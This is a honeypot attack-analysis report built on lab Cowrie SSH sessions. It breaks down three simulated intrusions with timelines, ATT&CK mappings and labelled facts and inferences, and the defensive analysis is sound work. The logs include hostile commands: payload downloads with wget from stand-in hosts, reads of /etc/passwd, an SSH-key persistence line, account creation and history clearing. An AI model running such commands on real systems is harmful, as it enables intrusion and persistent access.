# Attack Analysis (Stage 4)

> **Data status: LAB DATA, NOT REAL INTERNET ATTACKS.**
> Every session below comes from the team's own lab: source IPs are private
> (`172.18.0.1` Docker gateway, `10.77.0.2`), and the usernames/commands show
> team members testing the pipeline. This report demonstrates the analysis
> method. When real Azure honeypot data arrives, replace the three cases
> (see "Replace with real data" at the end).

Source: `cowrie.json` and `honeycomb.db` (`events`, `sessions`, `campaigns`).
Each statement is marked **Fact** (visible in the data) or **Inference**
(our reading of the data, may be wrong).

## Dataset overview

| Metric | Value |
| --- | --- |
| Sessions | 22 |
| Events | 377 |
| Source IPs | 2 (both private) |
| Active days | 1, 4, 15, 19, 26 Nov 2026 |
| Failed logins / successful logins | 14 / 22 |
| `file_download` events | 8 |
| Campaigns | 1 (`09907b1ebca7`, 8 sessions, confidence very_high) |

## Case 1: Scripted run with download and persistence (7 sessions, 26 Nov)

**Representative session:** `7ab3992c72d6` from `10.77.0.2`, 07:37:40 to 07:37:58 UTC.

| Time | Event | Detail |
| --- | --- | --- |
| 07:37:40 | login.failed | root / root |
| 07:37:41 | login.failed | root / 123456 |
| 07:37:42 | login.success | root / password |
| 07:37:44 | command | `whoami` |
| 07:37:46 | command | `id` |
| 07:37:47 | command | `uname -a` |
| 07:37:49 | command | `cat /etc/passwd` |
| 07:37:50 | command | `ps aux` |
| 07:37:52 | command + file_download | `wget http://example.com/payload.sh` |
| 07:37:53 | command | `chmod +x payload.sh` |
| 07:37:55 | command | `crontab -l` |
| 07:37:56 | command | `echo "ssh-rsa ...demo@attacker" >> ~/.ssh/authorized_keys` |
| 07:37:58 | command | `exit` |

**ATT&CK:** T1110.001 Password Guessing, T1078 Valid Accounts, T1033 System
Owner/User Discovery, T1082 System Information Discovery, T1087.001 Local
Account Discovery, T1057 Process Discovery, T1105 Ingress Tool Transfer,
T1098.004 SSH Authorized Keys.

- **Fact:** all 7 sessions from `10.77.0.2` have the identical command sequence.
- **Fact:** the gap between consecutive commands is exactly 1.5 s in the
  representative session.
- **Fact:** 8 sessions (these 7 plus `85652f5a6051`) share one SHA-256
  (`25ddf2c883e0d1958ea971d279a7e4f0fd446724ee3db7db19dadabd4a62e484`) and one
  URL (`http://example.com/payload.sh`), so the pipeline grouped them into
  campaign `09907b1ebca7`.
- **Inference:** a fixed 1.5 s rhythm and identical commands indicate a script
  (a bot), not a person typing. Since the source is a private lab address, it
  is most likely a team test script (not confirmed).

## Case 2: Human-style recon with cleanup (4 Nov)

**Session:** `d110b689b18a` from `172.18.0.1`, user `attacker1`, 19:06 to 19:07 UTC.

| Time | Event | Detail |
| --- | --- | --- |
| 19:06:21 | login.success | attacker1 / tt |
| 19:06:30 | command | `whoami` |
| 19:06:45 | command | `cat /etc/passwd` |
| 19:06:54 | command | `wget http://203.0.113.10/x.sh` |
| 19:07:04 | command | `chmod +x x.sh` |
| 19:07:16 | command | `history -c` |
| 19:07:25 | command | `exit` |

**ATT&CK:** T1078, T1033, T1087.001, T1105 (attempted), T1070.003 Clear Command History.

- **Fact:** no `cowrie.session.file_download` event exists for this session.
- **Inference:** the `wget` was typed but there is no proof the file was
  downloaded. Report it as an *attempt*. (`203.0.113.0/24` is a documentation
  range, so it is a test address.)
- **Fact:** `history -c` is the last action before `exit`.

## Case 3: Interactive session with typo and persistence attempt (4 Nov)

**Session:** `a639d573bac5` from `172.18.0.1`, user `attacker2`, 19:24 to 19:29 UTC.

| Time | Event | Detail |
| --- | --- | --- |
| 19:24:49 | login.success | attacker2 / tttt |
| 19:24:54 | command | `whoami` |
| 19:25:00 | command | `ls` |
| 19:25:08 | command | `cat?` (command.failed) |
| 19:25:35 | command | `crontab -l` |
| 19:25:46 | command | `useradd hacker` |
| 19:29:00 | command | `exit` |

**ATT&CK:** T1078, T1033, T1136.001 Create Account: Local Account (attempted).

- **Fact:** gaps between commands are 6 s, 8 s, 27 s, 11 s, then 194 s before `exit`.
- **Inference:** irregular gaps and a mistyped command suggest a person at a keyboard.
- **Fact:** `useradd hacker` ran inside Cowrie's fake shell, so no real account was created.

## What the three cases show

| | Case 1 | Case 2 | Case 3 |
| --- | --- | --- | --- |
| Bot or human | Bot (inference) | Human (inference) | Human (inference) |
| Download | Yes (event logged) | Attempted only | No |
| Persistence | SSH key | None | Account (attempted) |
| Evasion | None | `history -c` | None |

## Impact on the decision engine

Case 1 triggers the most evidence types (failed logins, successful login,
recon commands, file download), so it would score highest. Cases 2 and 3 would
land in MONITOR or LOG. This is a useful check of the scoring thresholds.

## Replace with real data

When the Azure honeypot archive arrives:
1. Put `cowrie.json` / `honeycomb.db` in `data/` (git ignores it).
2. Pick 3 sessions with an external source IP and different behaviors.
3. Replace the three cases above using the same structure (table, ATT&CK, Fact/Inference).
4. Delete the "LAB DATA" banner only after every case is real.
